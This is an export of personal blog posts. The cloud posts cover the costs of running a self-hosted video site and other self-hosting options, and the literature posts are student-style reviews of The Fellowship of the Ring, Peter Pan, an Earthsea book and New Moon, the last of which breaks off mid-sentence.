{"title": "Problems and Costs with Building Online Platforms", "date": "Wed Apr 03 2024 01:00:01", "type": "cloud", "body": "<h2 id=\"few-activities\">Few Activities</h2>\n<p>So I think the main problem here, inarguably, is that after building\na platform there aren\u2019t any people. My video platform tubeapp.org only\nhas me in it. Even if you got people signing up, chances are they aren\u2019t\ngoing to stay long.</p>\n<p>Unlike popular platforms like YouTube, Bilibili, and Instagram, where\nmany people visit on a daily basis, it\u2019s extremely hard to attract a\nreasonable amount of regular visitors (unless you host a copyright adult\nvideo website for free, like \u201cnoodlemagazine\u201d or \u201cvideosection,\u201d which\nis obviously against my morals). People just don\u2019t visit your\nwebsite.</p>\n<h2 id=\"so-why-not-go-back-to-popular-platforms\">So Why Not Go Back to\nPopular Platforms?</h2>\n<p>There are multiple reasons, and I thought I already stated them\nclearly, but just to clarify once again:</p>\n<ul>\n<li>Lack of customization</li>\n</ul>\n<p>I don\u2019t get to customize the homepage with HTML and CSS! Someone\ndesigned the ugly crap! I don\u2019t get to customize my contents! I have to\nfollow its term of service, which makes me very uncomfortable.</p>\n<ul>\n<li>Proprietary</li>\n</ul>\n<p>I don\u2019t have any idea what\u2019s going on in the backend! I run into an\nerror in the platform, then there is no solution at all, which makes me\npanic! Imagine having a bug and not being able to debug it, and the only\nway is to beg a proprietary company\u2019s programmers to solve it for you!\nIf it\u2019s open source, there would be open APIs and customizable client\nsides for users.</p>\n<p>There isn\u2019t an API to upload stuff (or upload stuff from MongoDB or\nwhatever, for that matter). I must crawl my way through a proprietary\nbuggy web interface daily only to upload and engage in discussions, ahh,\nso hard.</p>\n<p>There are lots of bugs (don\u2019t say there aren\u2019t bugs!) For example,\nBilibili\u2019s uploading speed is capped, and the file for subtitles is\nbuggy, etc.</p>\n<ul>\n<li>Vulgar eye-catching stuff</li>\n</ul>\n<p>There are many of those tech channels with a million subscribers that\nare not technical and even \u201cmisleading\u201d at times (or most of the time\nvery misleading), and the fact is that they get lots of views!</p>\n<p>Popular channels on YouTube include \u201cNetworkChuck\u201d and\n\u201cLinusTechTips\u201d (actually some folk with the same last name), and they\noffer no depth in terms of knowledge, only eye-catching simple stuff. I\nused to be interested in them one year ago, no more now, they are simply\ntoo shallow.</p>\n<p>These people probably earn lots of money and are doing it full time.\nMany comments down there are, in fact, even more misleading. (and that\nis on YouTube, not on Chinese platforms where almost nobody understands\ntech) For example, they compare distros based on desktop environments (I\nmean, what the heck?? You can literally customize the desktop\nenvironment to be anything you want!)</p>\n<ul>\n<li>Few views/comments as well</li>\n</ul>\n<p>Yeah, like I once opened a Bilibili account and posted programming\ncontent to it, tends to get around 50 views with no comments at all,\nwhich is sad.</p>\n<ul>\n<li>Privacy Concerns</li>\n</ul>\n<p>As we all know, privacy is a huge concern, especially for these video\nplatforms. You use a phone number to register, and those Chinese\nplatforms practically know who you are. They aren\u2019t E2E encrypted, and\neverything is public in China. So every word you say links to you, the\nreal person, on Chinese platforms (it\u2019s not necessarily always that bad,\njust a reminder not to say anything improper, or Winnie would jail\nyou!).</p>\n<ul>\n<li>No Rights for Users</li>\n</ul>\n<p>Some platforms have absolutely no rights for unsigned-in users, like\nTwitter, Instagram, or Bilibili. Without an account, you can\u2019t view or\nsee other people\u2019s posts. They even restrict those privacy frontends\nlike Invidious and Nitter (dead) and Bibliogram (also dead).</p>\n<ul>\n<li>Requires \u201cClever\u201d Javascript Tricks</li>\n</ul>\n<p>Some platforms have those strange frontend tricks that allow you to\ndo certain stuff (but not all), without logging in or something. Like\nswitching to mobile sites on browser console or copying the address then\nvisiting. Or freaking Apple phone playing video without full screen: by\nclicking the pop-out then when it pops out click the pop in again, then\nyou can watch videos in freaking crap safari without having to go full\nscreen. These clever tricks, although easy to learn, are dangerous to\nrely on because they are very misleading.</p>\n<ul>\n<li>Poor Performance</li>\n</ul>\n<p>Don\u2019t use the argument \u201cIt is a global and popular video platform, so\nit must have good performances.\u201d Wrong!</p>\n<figure>\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/Screenshot%20from%202024-04-03%2001-25-31.png\"\nalt=\"YouTube Lighthouse\" />\n<figcaption aria-hidden=\"true\">YouTube Lighthouse</figcaption>\n</figure>\n<p><img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/Screenshot%20from%202024-04-03%2001-29-37.png\"\nalt=\"Bilibili Lighthouse\" /> <img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/Screenshot%20from%202024-04-03%2001-35-23.png\"\nalt=\"Instagram Lighthouse\" /></p>\n<p>Maybe a person doesn\u2019t want 3rd party plugins or those cookie\nsessions, and wants a faster load. The point is these platforms treat\nusers like dumb idiots without giving them options. It has great power\nover its users, powers that it shouldn\u2019t have in the first place.</p>\n<p>My Vanilla implemented video platform (without preview image cap and\nCDN or addressing any SQL/caching issues):</p>\n<figure>\n<img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/Screenshot%20from%202024-04-03%2001-42-19.png\"\nalt=\"My Platform Lighthouse\" />\n<figcaption aria-hidden=\"true\">My Platform Lighthouse</figcaption>\n</figure>\n<h2 id=\"conclusion-of-popular-platforms\">Conclusion of Popular\nPlatforms</h2>\n<p>So like, there are lots of users there, so occasionally going there\nfor looking at user\u2019s comments is ok. Sometimes I am not looking for the\nvideo itself but looking for the comments on the video to get a general\nidea, or just for fun.</p>\n<p>Compared with only one YouTube, there are thousands of instances of\nPeertube (that is public), and Mastodon instances.</p>\n<p>So yeah, we won\u2019t talk about it anymore, and I don\u2019t compromise with\ncurrent popular social media. If I don\u2019t have views, fine, but it\u2019s\nbetter than having no power.</p>\n<h2 id=\"cloudflare\">Cloudflare</h2>\n<p>When uploading a video to Cloudflare S3, it takes a while for the\nvideo to load smoothly. When I first upload to it, I couldn\u2019t fully\nutilize the Internet connection speed in Hong Kong, but the speed is\ngood enough in the UK. It takes like half a day before I could watch the\nvideo easily from everywhere in the world.</p>\n<h2 id=\"lower-costs\">Lower Costs?</h2>\n<p>So Akamai is actually not a cheap company (although it isn\u2019t\nexpensive either). I found there is this cheap VPS hosting called\nHetzner, which builds its own servers. It offers 3 AMD CPU, 4GB RAM,\n80GB disk space at 8 USD/month, which is super cheap. It is like about\none half the price of Linode. But I\u2019ve used Linode for a long time and\nit works fine though.</p>\n<p>So by optimization, I can achieve the same performance with costs cut\nin half, but I am content with these platforms at the moment, I am also\nkind of lazy, and I don\u2019t want to switch.</p>\n<p>The German company Hetzner is super cheap, about half the price of\nLinode, offering 40 GB disk and 4 GB ram at 4 dollars a month. It\u2019s also\nbeen around for a long time, since 1997. But Hetzner mainly operates in\nEurope, and I really like Linode. There is no reason for me to migrate\nanyway. I thought like migrating would save me about 20 dollars a month,\nbut then again like everything is so costly. Subscribing to Poe or GPT\nfor a month is 20 dollars, and eating a dinner is sometimes 20 dollars.\nIt is just not worthy to save every penny.</p>\n<h2 id=\"lack-of-utilization\">Lack of Utilization</h2>\n<p>I put the background worker on a separate Linode with 8 GB ram, but\nit relaxes 90% of the time(since my website doesn\u2019t have many videos,\nand it\u2019s only me right now), so it is not utilizing enough of the\nmachine. But it can\u2019t run smoothly on lower ends Linodes though. I guess\nthat I just have to leave it be like this. Speaking of costs if I store\nlike 5 TB object storage that will cost about 100 dollars in popular\nplatforms like AWS or Google Cloud, so like this isn\u2019t very\nsignificant.</p>\n<h2 id=\"backing-up-s3-storage\">Backing Up S3 Storage</h2>\n<p>Suppose the cloud data center got a fire, then the data will be lost.\nObviously the chances is very very low, but such things do occur in\nhistory. So backing it up through 2 services is a good idea.</p>\n<p>Backblaze B2 is very cheap so I back everything up from Cloudflare S3\nto Backblaze B2 with boto3.</p>\n<p>Speaking of Object Storage, there is Backblaze B2 which is super\ncheap, offering at 6 USD/TB. Backblaze is a company that is \u201csolely for\nstorage purposes, not like AWS which uses its S3 to fund other\nprojects\u201d.</p>\n<p>And I can also buy a server at home, except that well, I don\u2019t want\nto manage the hardware full-time, and I pull the electricity\nsometimes.</p>\n<p>Blackblaze B2 is 3 times cheaper than AWS or Akamai object\nstorage.</p>\n<h2 id=\"references\">References</h2>\n<ul>\n<li><a href=\"https://www.cloudflare.com/products/r2/\">Cloudflare\nR2</a></li>\n<li><a href=\"https://www.linode.com/\">Akamai Linode</a></li>\n<li><a href=\"https://www.hetzner.com/\">Hetzner</a></li>\n<li><a href=\"https://www.backblaze.com/b2/cloud-storage.html\">Backblaze\nB2</a></li>\n<li><a href=\"https://joinpeertube.org/\">PeerTube</a></li>\n<li><a href=\"https://joinmastodon.org/\">Mastodon</a></li>\n</ul>\n", "_id": "66689631547d3fe09811872f"}
{"title": "Self Hosting Options", "date": "Sun Mar 03 2024 08:02:43", "type": "cloud", "body": "<p>Recently, the idea of self-hosting fascinates me. This is because I\nfind I can self-host pretty much all websites easily, including forums,\nvideo platforms, blogs. The only thing is the cost, which, actually\nisn\u2019t that much if hosting small instances.</p>\n<p>For example, purchasing 1 TB of object storage is only 15 dollars one\nmonth on Cloudflare R2. Akamai Linode offers this at 20 dollars a month\nfor 1 TB object storage. AWS offers similar pricing around 10 dollars to\n20 dollars (it has so many S3 models). Notably, Dropbox even has a\ncheaper price of $9.99 a month for 2 TB. There are also cheaper object\nstorages out there, except their performance and stability are not\nknown. But Dropbox is proprietary, and I have no idea what\u2019s going on,\nand Dropbox points my files to other files in the cloud with the same\nHash values, and Dropbox GUI can sometimes be unresponsive, which is\nannoying. Actually, performance speaking from my experience, Dropbox\nperforms much better and is fully utilizing the network speed. However,\nusing various tools like rclone and s3fs for like Akamai Linode or AWS\nis slower. Actually, I think it is because I am not fully utilizing\nthese tools, though.</p>\n<p>When I was a child, I didn\u2019t really know and think about such things,\nwith evil Windows OS making everything foreign and mysterious for me. I\ndidn\u2019t know what was going on in those websites, and that made me\nsuccumb to them. But over-relying is not a good practice, and I shall\nlearn to be independent and strong. That is what I dislike about Chinese\ntech companies, and also some Google and Microsoft services. They do\ncreate awesome available services, only for the individual to be used at\nthe cost of losing one\u2019s own mind and freedom in the digital\nInternet.</p>\n<p>But self-hosting has a main challenge, which is probably people won\u2019t\nnotice the website. I don\u2019t know why, but people seem awfully glued to\npopular platforms like Twitter, Instagram, and Bilibili and WeChat in\nChina. The sort of over-reliance on manipulating, proprietary, and buggy\napps makes me feel uncomfortable. It is this discomfort that drives the\nurge to go self-host, yet it is also this situation that an awesome app\nwill probably be ignored before it\u2019s dead. My website has few unique\nvisitors and few comments so far. I don\u2019t know why people are so\nreluctant to leave comments anonymously, though. Perhaps it\u2019s because\nthe total visitor is too small.</p>\n<p>It runs in the human mind\u2014that they want to stick to one thing, the\nthing they are familiar with, all their lives, especially Chinese\npeople. Many people choose inconvenient and trash platforms themselves,\nwhile complaining about it constantly without the urge to switch. The\nnumber of people doing this is too large, in fact, I find this behavior\nquite hard to comprehend. It is like having luxurious goods, and a\nlow-end bed, and always complaining how bad the bed is while not willing\nto change. There are better platforms out there, and anyone nowadays can\nhost one by buying cheap cloud storage. I think like Linode Nanode 5\ndollars a month is pretty much enough to host a small forum for\ndiscussion or something related. Don\u2019t say how much expertise it takes\nbecause, as a bottom student in the department of computer science, I am\npicking it up from raw only after less than half a year. Hosting a forum\nlike Discourse shouldn\u2019t be that hard. The main thing here is\ncustomization, and by customizing everything to suit my own needs, it is\ndefinitely better than the proprietary and fixed, not flexible\nplatforms.</p>\n<h2 id=\"invidiouspiped\">Invidious/Piped</h2>\n<p>There are loads of instances out there, and the one I use most\nfrequently is yewtu.be. Invidious doesn\u2019t store videos on its own\nservers; it traffics the YouTube videos.</p>\n<h2 id=\"forums\">Forums</h2>\n<p>Simply using the MERN stack to write a forum won\u2019t take that long, at\nmost in 1 week. There are also mature hosting services like Discourse\nforums. Anyways, they have their pros and cons. Writing one myself is\nbetter tailored to my preferences, while using the pre-built apps is\neasier and saves less hassle.</p>\n<p>Also, there is Mastodon, which is like a Twitter alternative. Nitter\nstopped functioning, so that probably died. But there are lots of other\nsmall forums good for a niche community.</p>\n<h2 id=\"video-hosting\">Video-Hosting</h2>\n<p>There are lots of video hosting platforms out there, thousands of\nmillions, judging by the large amounts of adult websites. Using Peertube\nor MediaCMS or YouPHPTube are some mature hosting platforms, but they\nrequire login to post videos by default. Anyways, raw coding is quite\neasy with the MERN stack and object storage.</p>\n<h2 id=\"security\">Security</h2>\n<p>Mainly when hosting, I would want to maintain the confidentiality and\nintegrity of the user\u2019s data. But if it is like a public platform, this\nisn\u2019t really that important since anyone can access the information</p>\n<h2 id=\"references\">References</h2>\n<ul>\n<li><a href=\"https://www.cloudflare.com/products/r2/\">Cloudflare R2\nPricing</a></li>\n<li><a href=\"https://www.linode.com/products/object-storage/\">Akamai\nLinode Object Storage</a></li>\n<li><a href=\"https://aws.amazon.com/s3/pricing/\">AWS S3 Pricing</a></li>\n<li><a href=\"https://www.dropbox.com/plans\">Dropbox Plans</a></li>\n<li><a href=\"https://rclone.org/docs/\">Rclone Documentation</a></li>\n<li><a href=\"https://github.com/s3fs-fuse/s3fs-fuse\">S3FS\nDocumentation</a></li>\n<li><a href=\"https://www.discourse.org/\">Discourse</a></li>\n<li><a href=\"https://invidious.io/\">Invidious</a></li>\n<li><a href=\"https://piped.video/\">Piped</a></li>\n<li><a href=\"https://joinmastodon.org/\">Mastodon</a></li>\n<li><a href=\"https://joinpeertube.org/\">PeerTube</a></li>\n<li><a href=\"https://mediacms.io/\">MediaCMS</a></li>\n<li><a href=\"https://www.youphptube.com/\">YouPHPTube</a></li>\n</ul>\n", "_id": "66689631547d3fe098118730"}
{"title": "The Fellowship of the Ring Book Review", "date": "Sun Aug 08 2021 14:36:15", "type": "literature", "body": "<h2 id=\"introduction\">Introduction</h2>\n<p>Lord of the Rings (LOTR) is a magic fantasy series written by J R R\nTolkien. There are four books in this series, The Hobbit, The Fellowship\nof the Ring, The Two Towers, The Return of the King.</p>\n<p>The Dark Lord Sauron wanted to reclaim his lost power through the\nring that he lost before. Frodo Baggins, a hobbit living in the Shire,\nstarted on his quest to destroy the ring of Sauron.</p>\n<h2 id=\"published-time\">Published time</h2>\n<p>Compared with other famous magic fantasies, LOTR was written very\nearly and was enjoyed by readers for many decades. It was published in\nthe 1950s. The Chronicles of Narnia was written about the same time.\nMost popular fantasy or science fiction series, such as Harry Potter or\nTwilight, were written in the past 30 years. This made Tolkien\u2019s fantasy\na classic. The book is also better constructed and detailed. ## Where\nthe story happens</p>\n<p>LOTR is set in middle-earth and concerns no modern world of man.\nBooks that were written later concerned more of the modern world. Harry\nPotter and Twilight series are set in Britain and America. This means\nthey include the present human beings along with their magical world.\nNarnia series include a parallel world that has many entrances (like a\nwardrobe).</p>\n<h2 id=\"different-kinds-of-people-or-creatures\">Different kinds of\npeople (or creatures)</h2>\n<p>There are five kinds of people in LOTR that play an important role.\nThose people are symbolized by the members in the fellowship: wizard,\nhobbit, elf, dwarf man. The villains are orcs, trolls, or hidden\ncreatures. The book gives readers a clear and deep description of the\nfive armies. Their minds and spirits are shown throughout the book.\nHarry Potter is mainly about wizards and muggles, and though they are\nmagical creatures, little is known about each of them and how they live.\nTwilight is about humans and vampires.</p>\n<p>The five kinds of creatures in LOTR all have characteristics of their\nown.</p>\n<p>The dwarves are stout, united, but arrogant. The song \u201cI see fire\u201d\n(in the movie) is all about them. One line goes \u201cIf this is to end in\nfore, then we should all burn together.\u201d They call themselves Durin\u2019s\nsons. They are very proud of their ancestors and the gold that they once\npossessed.</p>\n<p>Men are the strongest of all. Sauron was defeated by Isildur and\narmies of men. In the fellowship, Aragorn (king and heir of Isildur) and\nBoromir are the toughest. But men constantly desire power and can not\ncontrol themselves in many situations.</p>\n<p>Elves are wise, quick, and fair. They are described as casting a\nwhite light as they go. Their places are beautiful, often making others\nforget the time and sorrows of the outer world as they dwell there.\nTheir people are wise and always thought about what is needed for the\nfellowship.</p>\n<p>Hobbits are probably the weakest of all, they like to live a merry\nlife in their comfortable house, and most had not heard about the outer\nworld in the Shire. Their lives are but little difference over the\nyears. Yet Gandalf the wizard said \u201cSaruman believes it is only great\npower that can hold evil in check. But I found it is the small everyday\ndeeds of ordinary folk that keep the darkness at bay.\u201d Hobbits prove to\nhave the strongest wills. Aragorn described them as made of sterner\nstuff. Bilbo Baggins gave out the ring he possessed for many years.\nFrodo wasn\u2019t dead when he was injured in a fight with the black riders.\nEvil things can\u2019t live among the hobbits.</p>\n<p>Wizards are the most powerful, but they have their own problems.\nGandalf the grey knows many languages and histories of middle earth.\nSaruman the white surrendered to Sauron without fighting. They are wise\nbut are always seeking profits.</p>\n<h2 id=\"the-ring-of-sauron\">The Ring of Sauron</h2>\n<p>LOTR is about power and its disastrous effect. The ring of Sauron\nsymbolizes this power. Power made Sauron a dark lord, and power drove\nBoromir out of his mind when he longed for the ring. Seeking power,\nIsildur came to his death. Sauron wasn\u2019t so evil without the ring. Power\nis described as dangerous in the book. Gandalf insisted on Frodo taking\nthe ring to Mordor, for it is with Frodo that the ring can\u2019t work out\nits evil effects. Galadriel, the elven queen, resisted the ring in\nLothlorien for she feared to be evil just like Sauron.</p>\n<p>Why must the ring be destroyed? The book says that even if one can\nuse the ring to defeat the dark lord, he would become a new dark lord,\nonly worse. Boromir wanted to use the ring in his own will when he\nreturns to Minas Tirith, but he couldn\u2019t even control his own mind. The\nring bearer must have a strong will and be really powerful to use the\nring, but those with strong will and power prove to be even more\ndangerous with the ring.</p>\n<p>Yet with power, one can live long without showing signs of age, and\nrule the world. But the ring is also a thing of deception, as Bilbo\nclaimed it was a present from Gollum and instead of his stealing it.\nAlmost all that was seeking power failed and got destroyed in the end.\nNote that the book is published shortly after World War II. When the\nbook talks about men leading themselves to destruction, it is an\nindication of what was happening.</p>\n<h2 id=\"use-of-magic\">Use of Magic</h2>\n<p>There isn\u2019t much use of magic in LOTR. In Harry Potter, every fight\nis about wands and spells. In LOTR fighting still involves much use of\nweapons and strength. Wizards and elves use magic but they use it few\ntimes. The book is more concerned with power.</p>\n<h2 id=\"changes-in-the-movie\">Changes in the Movie</h2>\n<p>The movie by Peter Jackson is really magnificent. It is carefully,\nmade and every scene just attracts you. But the movie is not consistent\nwith the book in many parts.</p>\n<p>The movie left out Tom Bombadil, an important character in the book.\nTom and Goldberry live in their own lands. Tom sings songs to bar out\nthe evil and his land is free from dark forces. The ring has no power\nover him. Tom provided shelter for Frodo and the hobbits on their way to\nBree when they were pursued by the black riders.</p>\n<p>There are also many other minor changes in the movie. It is not Arwen\nthat saved Frodo when he was injured from the black riders\u2019 attack. The\nelf who came for them was a man called Glorfindel. Frodo rode on the\nhorse alone and escaped himself. The flood on the river to Rivendell was\nsummoned by Elrond, the elven king, and Mithrandir (Gandalf). Gimli\ndidn\u2019t strike the ring with his ax during the council of Elrond, and the\ncouncil is long and many other things are talked about rather than who\nshould go to Mordor with the ring. The fellowship was later selected\ninstead of volunteered during the council. Gandalf and Saruman didn\u2019t\nduel when Saruman was found to have betrayed.</p>\n<p>These changes made the movie more dramatic and appealing but make it\nconfusing to read the book.</p>\n<h2 id=\"what-i-dislike-about-lotr\">What I dislike about LOTR</h2>\n<p>LOTR is a masterpiece, speaking of magic fantasy. But there are a few\nthings I don\u2019t like about it. Everyone who reads the book or watches the\nmovie knows Frodo and Sam will defeat Sauron eventually before book 1\nends. The ending is so easily revealed. There are many adventures on the\nway but the villains are always defeated, making them repetitive. The\nimportant characters never die. The book is too long. It contains 560\nthousand words and nearly 2000 pages. But that is a big problem for\nother fantasy series. Harry Potter contains over a million words and A\nGame of Thrones is almost twice that number.</p>\n", "_id": "66689631547d3fe098118731"}
{"title": "Peter Pan Book Review", "date": "Tue Aug 17 2021 09:45:32", "type": "literature", "body": "<h2 id=\"summary\">Summary</h2>\n<p>Soloman in Kensington Garden and sends birds to ladies who asked for\nchildren. The birds later become boys or girls. Every child grows up,\nexcept Peter Pan. He flew out of his window when he was a week old and\narrived at Kensington Gardens. When he returned to his mother, he found\nthe window barred and he couldn\u2019t go back.</p>\n<p>One day, when the Darling family went to a party and Nana (the nurse\nwho is a dog) wasn\u2019t on guard, Peter Pan came. He taught the children to\nfly and the darling children, Wendy, John, and Michael flew with him to\nNeverland. Captain Hook, a pirate who is very sinister is their enemy.\nPeter and his boys succeeded in defeating the pirates and killing Hook.\nThe children returned to their homes and grew up. Years later Peter came\nagain for spring cleaning time but found Wendy became a lady. He flew\nwith Jane, her daughter, to Neverland.</p>\n<h2 id=\"a-simple-story\">A Simple Story</h2>\n<p>Peter Pan is a children\u2019s classic book. Other children\u2019s classic\nbooks include The Wizard of Oz, Black Beauty, and Alice in Wonderland.\nThose books can be read by both children and adults, for they usually\nhave a deep meaning based on a simple story.</p>\n<p>The story of Peter Pan is very simple and easy to understand.\nHowever, what\u2019s worth noticing is the characters in it and the detailed\ndescription of them. There are many symbols in this book. The symbols or\nstory may not be realistic or strict. One should understand what they\nintended to tell when reading such books and pay attention to the very\nbeautiful style of writing behind it.</p>\n<p>For example, Barrie wrote \u201cAll children could have such\nrecollections, for, having been birds before they were human, they are\nnaturally a little wild during the first few weeks, and very itchy at\nthe shoulders, where their wings used to be.\u201d This is intended to show\nthat children are free and have no boundaries, just like a bird that can\nfly in the wild.</p>\n<h2 id=\"children-vs-adult\">Children vs Adult</h2>\n<p>In the book, children are described as \u201cgay and innocent and\nheartless.\u201d Peter Pan is always forgetful of things, forgetting about\nHook, forgetting about time. He is always joyous and ignorant of things\nthat had happened. For example, when he broke into the Darlings\u2019 house,\nhe tried to glue his shadow on with soap. When Wendy sewed it for him,\nhe thought it was him instead of Wendy that fixed his shadow. He was\nproud of himself claims he has never slept when Hook poisoned him. He\nlent Hook a hand after Hook was inferior and in a worse position than\nhim. He never knew how to cheat.</p>\n<p>Michael, the youngest of the children, drank his medicine when\nMr.\u00a0Darling refused. For his need of good form, Mr.\u00a0Darling gave Nana\nhis medicine after that and tied Nana to a tree. This ignorance and\narrogance caused a lot of trouble later. This shows the cowardly side of\ngrown-ups.</p>\n<p>Hook and Smee are dark and bad-natured. The pirates care about good\nform, but the real thing is, they are afraid of facing themselves.</p>\n<p>Hook desperately tried for good form till the last moment of his\nlife, claiming he is the only one sea cook feared. He said he wanted his\nson to have a claw rather than a hand, to show he is not defeated. He\nwas trying to hunt down others all the time. He designed the fight with\nredskins to cheat the boys to go out. Hook clawed Peter when Peter gave\nhim a hand.</p>\n<p>In the book, Hook is being chased endlessly by a ticking crocodile.\nThe clock inside shows that time of one\u2019s life is going past just every\nmoment, and that one is always being chased and hunted down.</p>\n<p>The boys sleep in one bed and turn together, which showed they are\npractically the same. They argue but are very cooperative. The pirates\nare not. When Hook asked others volunteer to go into the cabin where\nPeter Pan is they all refused. Like dogs, Hook treated the pirates. And\nlike dogs, they showed him their fangs. When they were dying, they\nthought they were the last ones alive. They were not seeking help from\nothers and lost the fight, though one to one they are stronger than the\nboys. Captain Hook is a symbol of many people in this world and the dark\nside of the author himself.</p>\n<h2 id=\"sadness-in-the-loss-of-childhood\">Sadness in the Loss of\nChildhood</h2>\n<p>This book has a deep sense of melancholy when one reads it many\ntimes. When Maimie left Peter Pan and got back to her mother, afraid of\nstaying with him too long, she could only look across the Serpentine and\nnever went back.</p>\n<p>When Wendy grew up, she refused to go with Peter to Neverland. She\ntried to be small but couldn\u2019t anymore. The questions asked by Peter and\nthe obvious answers behind them are very sad. When all is changed and\nthe nursery is no longer what it was, Peter was still himself after all\nthose years. He still had those first teeth with him, though he forgot\nhe didn\u2019t come for a long time and all about Hook. The children all grew\nup, and John and Michael are no longer sleeping in the same house.\nChildren grew to lose their flying ability and fail to believe. Growing\nup is a process every child goes through. The book ends with Jane being\ngrown-up and Margaret, her daughter, flying to Neverland with Peter\nPan.</p>\n<p>Childhood symbolizes the thing one went through once but can never\nlinger long. Ultimately, one has to grow up and be exposed to the\ndiverse and unkind world. This is what Barrie wants to tell. This book\ndeals with the thing everybody lost when they become old. The author\nremembers the \u201cgay and innocent and heartless\u201d feeling when he was young\nand detest cheating and the unfairness of adults. Childhood is so simple\nand pure for us as one has nothing to care about, and can always be like\nPeter Pan, who forgets just about everything and take no note of the\npassing time. Barrie wants to fly away just like Peter did and enjoy the\nfreedom of the world. In the book, he explained flying as \u201cbeing lifted\nby lovely thoughts.\u201d One fails to fly only when he doesn\u2019t believe\nanymore. He also wants a mother to care for him always, as Peter found\nand brought Wendy to Neverland. He expressed his thoughts with metaphors\nin the book. The real world disagrees with Barrie\u2019s thoughts and he puts\nthe contradiction down in his book.</p>\n<p>In fact, physically, J M Barrie himself is only a little taller than\n5 feet and always looked like a child in his life. He is always the\nsame. He found his life hard in society and eventually became friends\nwith children (the Llewelyn Davies). This relationship is much more\nlong-lasting than his marriage, and the Davies even vacationed with him.\nHe even supported them financially. When the five children grew up,\nhowever, they aren\u2019t so close with him anymore. His relationship with\nthem ended tragically when Davies\u2019 parents died and one of the children\ndrowned.</p>\n<p>The book tells stories using make-believe and narrative tone. The\nauthor expresses his thoughts in a magic world of fairies. He is\nmelancholy for the constant changes in the real world and despises the\nsinister side of adults. He describes Percy Shelley in the third chapter\nof Peter Pan in Kensington Gardens. Shelley is as grown-up as he need\never expect to be and is never exactly grown-up. He despises money\nexcept what you need for today and made a paper boat of his bank note\nand sent it sailing on the serpentine. This is a reflection of\nhimself.</p>\n", "_id": "66689631547d3fe098118732"}

With a gift in magic, he\nproved it when he saved his villagers from invaders. However, his aunt\nis a witch who knew little about magic and could not satisfy Ged. This\nled to Ged\u2019s hunger in learning magic and proving himself.</p>\n<p>Thus, when Ogion taught him almost nothing he became impatient, Ogion\nwanted to teach him to be silent and listen while he wanted to learn\nspells. He was arrogant and not contented, he wanted his talent in\nsorcery to be realized. That\u2019s why he couldn\u2019t stand the girl\u2019s teasing\nand released the shadow. But he wasn\u2019t strong enough that time and Ogion\nwas there to protect him. The shadow settled him and ceased his\narrogance for some time. But his decision to go to Role showed it was\nstill in his heart, and it would lead to danger at any second.</p>\n<p>When Ged arrived at Role, he began learning fast, contenting himself\nwith books and losing awe in everybody, even the Archmage, When Jasper\nlooked down on Ged, he desperately wanted to show himself, He wanted\neverybody to watch him with awe. At the feast, Ged forgot everything.\nThe only thing he wanted to do was to beat Jasper. When Jasper asked him\nto summon a spirit, he put the fear of the first shadow he released away\nfrom his mind. The first shadow showed Ged was a fool and he wanted to\nsay he wasn\u2019t. Though Ged verified himself at last, it led to the\nArchmage\u2019s death and his scar. <img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/a102111d-717f-4e86-9b6e-bc5add68e67d_image-1.png\"\nalt=\"alt text\" /> Finally, Ged\u2019s brain cleared and realized he is\nnothing but a big fool. He lost everything he tried to get. He was\nself-conscience and guilty. He wanted to do something good. So, he\nbecame selfless, the one who he should be at first.</p>\n<p><img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/1459e935-9555-4ff3-8cab-0337d36f6600_image-2.png\"\nalt=\"alt text\" /> Ged, with his strong will and bravery, defeated the\ndragon and protected the people of Low Torning; with his mind turned far\nfrom fame and wealth, withstand the lure of the stone to rule the world;\nwith his strong hate of his old self, followed Ogion\u2019s advice and went\nhunting after the shadow. After much efforts Ged finally became whole\nagain. This book told us to stay modest and silent. The shadow\nrepresents the tedious and boring things in life we must do. We\nshouldn\u2019t let them bother us but face them bravely and defeat them. Only\nthen, we can be whole.</p>\n<p><img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/88d5f38a-15b9-4f62-8479-fb5779e14f0a_image-3.png\"\nalt=\"alt text\" /> Another thing to notice is that Ged is dark-shinned\nunlike other heroes.

{"title": "New Moon Book Review", "date": "Mon Jan 31 2022 09:28:23", "type": "literature", "body": "<h2 id=\"introduction\">Introduction</h2>\n<p>The Twilight series is written by Stephenie Meyer. It immediately got\npopular and became an international bestseller. Over the past ten years,\nthe books have been beloved by many young adults.</p>\n<p>The four books in the Twilight series are mostly focused on the\nrelationship between Bella Swan and Edward Cullen. Rather than a fantasy\nabout vampires, it is more of a romance novel. Magic is only used to\nmake help make the plot more exciting.</p>\n<p>The second book, New Moon, follows the first book Twilight. It\ncontinues with the story of Bella. At the start of the book, Bella\nturned eighteen. However, at her birthday party, things went wrong and\nEdward decided to leave her. Bella was devastated over the loss and\nstarted having nightmares. She was nearly driven crazy. Finally, she\nfound a friend, Jacob Black. Soon they grew inseparable, and Jacob\u2019s\nsecret as a werewolf was revealed. As the Cullens returned, Bella must\nchoose for herself the road to follow.</p>\n<p><img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/ce32594b-76c7-4f95-9dd4-a4a2211c9bb7_image.png\"\nalt=\"alt text\" /> ## Immortality</p>\n<p>In Twilight, vampires are immortal and can live for hundreds of\nyears. Edward Cullen is 109 years old. However, their appearances hardly\nchange. The Cullens all look very young. It seems that the vampires are\nperfect, in Bella\u2019s eyes, with strength, speed, and wealth. However,\nthis may not always be the case.</p>\n<p>Vampires lost their souls. They are always thirsting for blood and\ncan\u2019t help murdering people. They are not allowed to show their secrets\nto humans and had to follow the rules of the Volturi. They must always\nbe very cautious and go into hiding. Vampires are very lonely. They can\nnever be a part of the human world for long.</p>\n<p><img\nsrc=\"https://d2i1hz5l7317aw.cloudfront.net/9f124970-ec66-4267-a6df-783432a30958_image-1.png\"\nalt=\"alt text\" /> That is why when Bella asked to be a vampire, Edward\nalways refused. There is beauty in the mortal world. She has a future to\nconsider. It is not so easy as that to be a vampire, just a bite and\nnothing more. Edward insisted on Bella going to college, which is her\nplan B. He wanted her to at least enjoy a few years of her life. When\nEdward left Bella in the woods at the beginning of the book, he was\nhoping that maybe she would start a new life without him.</p>\n<h2 id=\"lust\">Lust</h2>\n<p>Edward and Bella always lust for each other. When Edward didn\u2019t\nreturn for four months, Bella was so depressed that she was just like a\nzombie, as she described. After watching the movie with Jessica, Bella\nfound Edward\u2019s 